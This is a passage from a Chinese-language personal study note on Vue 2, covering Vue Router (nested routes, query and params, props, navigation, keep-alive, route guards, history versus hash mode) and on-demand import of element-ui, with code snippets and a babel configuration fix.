    <div>
        <h2>我是Home的内容</h2>
    </div>
</template>

<script>
    export default {
        name: "Home"
    }
</script>
================================
<template>
    <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
    </div>
</template>

<script>
    export default {
        name: "Banner"
    }
</script>
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202162227994.png" alt="image-20220216222723142" style="zoom:80%;" />

### 注意:warning:

> 1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹
> 2. 通过切换，“隐藏”了的路由组件，默认是被销毁的，需要的时候再去挂载
> 3. 每个组件都有自己的`$route`属性，存储自己的路由信息
> 4. 整个应用只有一个router，可通过组件的`$router`属性获取

## 嵌套路由

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/y202202171958278.png" alt="image-20220217195817118" style="zoom:80%;" />

### 配置多级路由

```js
import VueRouter from 'vue-router';
import About from "../pages/About";
import Home from "../pages/Home"
import Message from "../pages/Message";
import News from "../pages/News";
export default new VueRouter({
    routes: [
        {
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'message', //不能写成“/message”
                    component: Message
                },
                {
                    path: 'news', //不能写成“/news”
                    component: News
                }
            ]
        },
    ]
})
```

### 跳转（要写完整路径）

```html
<template>
    <div>
        <h2>我是Home的内容</h2>
        <ul class="nav nav-tabs">
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
            </li>
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
            </li>
        </ul>
        <router-view></router-view>
    </div>
</template>

<script>
    export default {
        name: "Home"
    }
</script>
```



## 路由传参

### query参数

```html
<!--                路由跳转，携带参数，to的【字符串】写法-->
<router-link :to="`/home/message/detail?id=${item.id}&title=${item.title}`">{{item.title}}</router-link>
<!--                路由跳转，携带参数，to的【对象】写法-->
<router-link :to="{
     path:'/home/message/detail',
     query: {
               id:item.id,
               title:item.title,
            }
    }">{{item.title}}</router-link>
<script>
data() {
            return {
                messageList: [
                    {id: '001', title: '消息1'},
                    {id: '002', title: '消息2'},
                    {id: '003', title: '消息3'},
                ]
            }
        }
</script>
#接收参数
        <li>消息编号：{{$route.query.id}}</li>
        <li>消息内容：{{$route.query.title}}</li>
```



### 命名路由

> 使用`name`，跳转地址只能使用**to的对象写法**，用name属性。否则会被解析成path路径
>
> :stop_sign:~~:to="xiangqiang"~~

```html
<router-link :to="{
                    //path:'/home/message/detail',
                    name:'xiangqing', //使用name简化
                    query: {
                        id:item.id,
                        title:item.title,
                    }
                }">{{item.title}}
                </router-link>
<script>
    routes: [
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name:'xiangqing', //给路由命名
                            path: 'detail',
                            component: Detail,
                        }
                    ]
                },
            ]
        },
    ]
</script>
```

### params参数

> restful风格
>
> :warning:使用`params`参数,to的对象写法,<u>不能使用`path`属性</u>,**只能使用`name`属性**

```html
<router-link :to="`/home/message/detail/${item.id}/${item.title}`">{{item.title}}</router-link>
<router-link :to="{
                    // path:'/home/message/detail',
                    name:'xiangqing',
                    params: {
                        id:item.id,
                        title:item.title,
                    }
                }">{{item.title}}
                </router-link>
===================================================
#route -> index.js
<script>
children: [
                        {
                            name:'xiangqing',
                            path: 'detail/:id/:title', //占位符接收params参数
                            component: Detail,
                        }
                    ]
</script>
#接收参数
<li>消息编号：{{$route.params.id}}</li>
<li>消息内容：{{$route.params.title}}</li>
```

### props配置

> 使路由组件更方便的收到参数

```js
#route -> index.js
======================================
{
     path: 'message',
     component: Message,
     children: [
           {
              name:'xiangqing',
              path: 'detail',
              component: Detail,
               //第一种写法:props值为对象,该对象中所有的key-value会通过props传给Detail组件
              props:{a:334},
               //第二种:props值为布尔值,则把路由收到的所有params参数通过props传给Detail组件
              props:true
               //第三种:props值为函数,该函数返回的对象中每一组key-value都会通过props传给Detail组件
              props($route){
                    return{
                           id:$route.query.id,
                            title:$route.query.title,
                          }
                      }
               }
      ]
}
=====================================
#Message.vue
<router-link :to="`/home/message/detail?id=${item.id}&title=${item.title}`">{{item.title}}</router-link>
=====================================
#Detail.vue
<template>
    <ul>
                <li>消息编号：{{id}}</li>
                <li>消息内容：{{title}}</li>
    </ul>
</template>

<script>
    export default {
        name: "Detail",
        props:['id','title']
    }
</script>
```



## router-link的replace属性

> 控制路由跳转时操作浏览器历史记录的模式

1. push:追加历史记录(默认)
2. replace:替换当前记录

### 开启

```html
<router-link :replace="true" class="list-group-item" active-class="active" to="/about">About</router-link>
==============或者简写
<router-link replace class="list-group-item" active-class="active" to="/about">About</router-link>
```



## 编程式路由导航

> 不借助`<router-link>`实现路由跳转

```html
<button @click="push(item)">push</button>
<button @click="replace(item)">replace</button>
<script>
methods: {
            push(item) {
                //参数和to里面的ca
                this.$router.push({
                    name: 'xiangqing',
                    query: {
                        id: item.id,
                        title: item.title,
                    }
                })
            },
            replace(item) {
                this.$router.replace({
                    name: 'xiangqing',
                    query: {
                        id: item.id,
                        title: item.title,
                    }
                })
            }
        }
</script>
========================================
<button @click="back">后退</button>
<button @click="forward">前进</button>
<button @click="go">前进</button>
<script>
methods:{
            back(){
                this.$router.back();
            },
            forward(){
                this.$router.forward()
            },
            go(){
                this.$router.go(-1)
            }
        }
</script>
```

## 缓存路由组件

> 让不展示的路由组件保持挂载，不被销毁！

```js
<keep-alive include="News"> //include里面是【组件名】，不写默认对此处所有的路由生效
    <router-view></router-view>
</keep-alive>
//缓存多个路由组件
<keep-alive :include="['News','Message']">
```

## 路由独占的生命周期钩子

> 捕获路由组件的激活状态

```js
activated 路由组件被激活时触发
deactivated 路由组件失活时触发
```

```
如果想要在被缓存数据的路由1组件中，激活一个定时器。当切走的时候，由于组件未被销毁，定时器还会执行，可使用deactivated销毁定时器
```

## 路由守卫-全局前置

> > 写在router文件夹下的index.js,对应的路由对象里面
>
> 对路由进行权限控制
>
> 1. 全局守卫
> 2. 独享守卫
> 3. 组件内守卫



### 全局守卫

```js
const router = new VueRouter({...})
//初始化时、每次路由切换之前被调用
router.beforeEach((to, from, next) => {
    if (to.meta.isAuth) {
        console.log(to, from)
    } else {
        next()
    }
})
//初始化时、每次路由切换之后被调用
router.afterEach((to, from) => {
    document.title = to.name + from.name
})
export default router
```

### 独享守卫

```js
beforeEnter(to,from,next){
     console.log(to,from,next)
}
```

### 组件内守卫

```js
//通过路由规则，进入组件被调用
beforeRouteEnter(to, from, next) {
    console.log(to, from, next)
},
//通过路由规则，离开组件被调用
beforeRouteLeave(to, from, next) {
   console.log(to, from, next)
}
```

## history模式和hash模式

1. #及其后面的内容就是hash值
2. hash值不会包含在http请求中，hash值不会带给服务器
3. hash模式：
   1. 地址永远带着#，不美观
   2. 若以后将地址通过第三方手机app共享，若app校验严格，则地址会标记为不合法
   3. 兼容性较好
4. history模式：
   1. 地址干净，美观
   2. 兼容性和hash模式比较略差
   3. 应用部署上线时需要后端支持，解决刷新页面服务端404的问题

```js
npm run build #打包成html+css+js
放在服务器上static或者public目录下,即可访问
```



# Vue UI组件库

## element-ui的基本使用

### 移动端

Vant [介绍 - Vant Weapp (youzan.github.io)](https://youzan.github.io/vant-weapp/#/home)

Cube UI [cube-ui Document (didi.github.io)](https://didi.github.io/cube-ui/#/zh-CN)

Mint UI [Mint UI (mint-ui.github.io)](https://mint-ui.github.io/#!/zh-cn)

### pc端

Element UI [Element - 网站快速成型工具](https://element.eleme.cn/#/zh-CN)

IView UI [iView - A high quality UI Toolkit based on Vue.js (iviewui.com)](https://www.iviewui.com/)

Ant Design [Ant Design - 一套企业级 UI 设计语言和 React 组件库](https://ant.design/index-cn)



## element-ui 按需引入

借助 [babel-plugin-component](https://github.com/QingWei-Li/babel-plugin-component)，我们可以只引入需要的组件，以达到减小项目体积的目的。

首先，安装 babel-plugin-component：

```bash
npm install babel-plugin-component -D
```

然后，将 `babel.config.js` 修改为：

```json
module.exports = {
    presets: [
        '@vue/cli-plugin-babel/preset',
        ["es2015", {"modules": false}]
    ],
    plugins: [
        [
            "component",
            {
                "libraryName": "element-ui",
                "styleLibraryName": "theme-chalk"
            }
        ]
    ]
}
```

接下来，如果你只希望引入部分组件，比如 Button 和 Select，那么需要在 main.js 中写入以下内容：

```javascript
import Vue from 'vue';
import { Button, Select } from 'element-ui';
import App from './App.vue';

Vue.component(Button.name, Button);
Vue.component(Select.name, Select);
/* 或写为
 * Vue.use(Button)
 * Vue.use(Select)
 */

new Vue({
  el: '#app',
  render: h => h(App)
});
```

> npm run serve启动报错！！！
>
> Error: Cannot find module 'babel-preset-es2015'
>
> ```
> npm i babel-preset-es2015
> ```
>
> Error: Plugin/Preset files are not allowed to export objects, only functions. In D:\360Downloads\web_workspace\web_projects_importments\router_test\node_modules\babel-preset-es
> 2015\lib\index.js
>
> ```
> 修改babel.config.js中的presets参数
> 【es2015】 为 【@babel/preset-env】
> ```


